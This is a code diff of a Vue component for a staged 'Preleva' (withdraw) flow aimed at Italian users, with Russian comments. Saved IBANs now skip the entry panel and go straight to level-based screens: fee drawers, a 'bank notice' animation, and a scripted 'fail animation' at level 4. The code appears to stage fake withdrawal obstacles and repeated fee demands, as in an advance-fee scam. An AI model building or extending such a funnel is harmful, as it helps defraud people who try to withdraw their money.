@@ -37,7 +37,7 @@ import { useCabinetTab } from '@/composables/useCabinetTab'
 const { t } = useI18n()
 const account = useAccountStore()
 const dossier = useDossierStore()
-const { steps, canWithdraw, isAuthorizing } = useAccount()
+const { steps, canWithdraw, isAuthorizing, approvedAmount } = useAccount()
 const {
   isPayFee,
   isMessenger,
@@ -182,11 +182,11 @@ function startWithdrawFunnel(): void {
 }
 
 /**
- * Preleva (как на Calipso):
- *  1) Сначала только кнопка «Preleva i fondi».
- *  2) Клик → под балансом выпадает «Scegli il metodo di ricezione»
- *     (IBAN/Carta + intestatario + сумма). IBAN автозаполняется, если уже есть.
- *  3) «Avvia il trasferimento» → drawer комиссии / анимация L2–L4.
+ * Preleva по 4 этапам:
+ *  · Этап 1 (или IBAN ещё не сохранён) → выпадающая панель «Scegli il metodo»
+ *    (ввод IBAN один раз).
+ *  · Этапы 2 / 3 / 4, IBAN уже есть → панель НЕ открываем, сразу анимация /
+ *    воронка этапа (L2 notice+anim, L3 fee/policy, L4 fail anim).
  */
 function onWithdraw(): void {
   if (!canWithdraw.value) return
@@ -195,24 +195,32 @@ function onWithdraw(): void {
     openFeeFromSuspension()
   }
 
-  /* Всегда панель под кнопкой — не прыгаем сразу в drawer. */
-  if (payoutPanelOpen.value) return
-  payoutPanelOpen.value = true
+  const hasIban = account.ibanProvided && account.ibanFull.trim() !== ''
+
+  /* IBAN ещё нет — только панель ввода (обычно этап 1). */
+  if (!hasIban) {
+    if (payoutPanelOpen.value) return
+    payoutPanelOpen.value = true
+    return
+  }
+
+  /* IBAN уже зафиксирован → этапы 2–4 (и повтор L1) без повторного ввода. */
+  continueAfterPayout(Math.round(approvedAmount.value))
 }
 
-/** После панели (или если IBAN уже был) → drawer комиссии / анимация. */
+/** После панели или сразу (если IBAN есть) → drawer / анимация по уровню. */
 function continueAfterPayout(euros: number): void {
   withdrawAmount.value = euros
   payoutPanelOpen.value = false
 
-  // L1 / L3 / страховка: pay_fee → drawer (3 шага).
+  // L1 / L3 / страховка: pay_fee → drawer (IBAN-шаг пропускается, если уже есть).
   if (level.value === 1 || level.value === 3 || isSuspended.value) {
     if (!isPayFee.value) beginWithdraw()
     commissionOpen.value = true
     return
   }
 
-  // L2 / L4: банк-уведомление или анимация отказа.
+  // L2 / L4: банк-уведомление или анимация.
   startWithdrawFunnel()
 }
 
